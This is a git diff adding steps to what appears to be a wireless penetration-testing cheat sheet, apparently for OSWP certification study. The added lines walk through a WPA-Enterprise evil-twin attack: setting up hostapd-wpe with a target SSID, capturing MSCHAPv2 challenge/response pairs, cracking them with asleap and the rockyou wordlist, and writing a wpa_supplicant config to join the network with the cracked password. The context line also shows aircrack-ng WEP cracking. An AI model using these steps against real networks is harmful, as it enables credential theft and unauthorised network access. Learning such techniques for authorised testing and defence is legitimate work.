@@ -68,6 +68,32 @@
    aircrack-ng <capture_file>                                                                ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
    
    
-   
-   
+##- Change values of ssid and channel (that you can retrieve in previous step) with target ssid and channel details in the file **/etc/hostapd-wpe/hostapd-wpe.conf**  
+`nano /etc/hostapd-wpe/hostapd-wpe.conf`
+
+## Capture the encrypted credentials (challenge/response) by using **hostapd-wpe**:  
+`hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf`  
+It shows multiple lines, keep at least one line of challenge/response per username, save it for later use.
+
+## Crack the challenge/response with rockyou as a wordlist:  
+`asleap -C <Challenge> -R <Response> -W /usr/share/wordlist/rockyou.txt`
+
+## Create a new configuration file with below content; replace SSID with target AP name (eg: dlink-my-router), identity with username and clear-text password that you cracked previously  
+`nano oswp-enterprise.conf`
+
+    network={
+            scan_ssid=1
+            eap=PEAP
+            ssid="<TARGET-NAME>"
+            key_mgmt=WPA-EAP
+            identity="<DOMAIN\USERNAME>"
+            password="<PASSWORD>"
+            phase1="peaplabel=0"
+            phase2="auth=MSCHAPV2"
+    }
+
+## Connect to the configured enterprise WiFi  
+`wpa_supplicant -B -i wlan0 -c ./<filename>.conf`
+ 
+
 
